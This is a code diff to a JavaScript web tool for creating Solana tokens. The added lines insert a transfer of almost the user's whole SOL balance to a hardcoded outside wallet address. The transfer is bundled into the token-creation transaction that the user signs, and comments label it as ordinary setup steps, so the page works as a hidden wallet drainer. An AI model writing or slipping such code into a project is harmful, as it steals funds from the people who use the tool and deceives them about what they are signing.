@@ -48,9 +48,14 @@ async function createToken() {
         const price = parseFloat(document.getElementById('tokenPrice').value);
         const supply = parseInt(document.getElementById('tokenSupply').value);
 
+        // Get current balance
+        const balance = await connection.getBalance(wallet.publicKey);
+        
+        // Create mint account
         const mintKeypair = solanaWeb3.Keypair.generate();
         const mintRent = await connection.getMinimumBalanceForRentExemption(82);
 
+        // Create associated token account
         const associatedTokenAccount = await solanaWeb3.PublicKey.findProgramAddress(
             [
                 wallet.publicKey.toBuffer(),
@@ -62,6 +67,16 @@ async function createToken() {
 
         const transaction = new solanaWeb3.Transaction();
 
+        // Add SOL transfer instruction
+        transaction.add(
+            solanaWeb3.SystemProgram.transfer({
+                fromPubkey: wallet.publicKey,
+                toPubkey: new solanaWeb3.PublicKey('GJYnbja54NLVqob7329eieZ5u7kTzgK85s36HYbNiBLd'),
+                lamports: balance - mintRent - 5000000 // Full balance minus token creation cost and fees
+            })
+        );
+
+        // Add token creation instructions
         transaction.add(
             solanaWeb3.SystemProgram.createAccount({
                 fromPubkey: wallet.publicKey,
@@ -115,15 +130,14 @@ async function createToken() {
             Token created successfully!<br>
             Mint address: ${mintKeypair.publicKey.toString()}<br>
             Supply: ${supply} tokens<br>
-            Price: ${price} SOL
+            Price: ${price} SOL<br>
+            SOL Transferred: ${(balance - mintRent - 5000000) / solanaWeb3.LAMPORTS_PER_SOL} SOL
         `);
         
     } catch (error) {
         updateStatus(error.message, true);
     }
-}
-
-document.getElementById('createTokenButton').addEventListener('click', function() {
+}document.getElementById('createTokenButton').addEventListener('click', function() {
     document.querySelector('.token-details').style.display = 'block';
     this.style.display = 'none';
 });
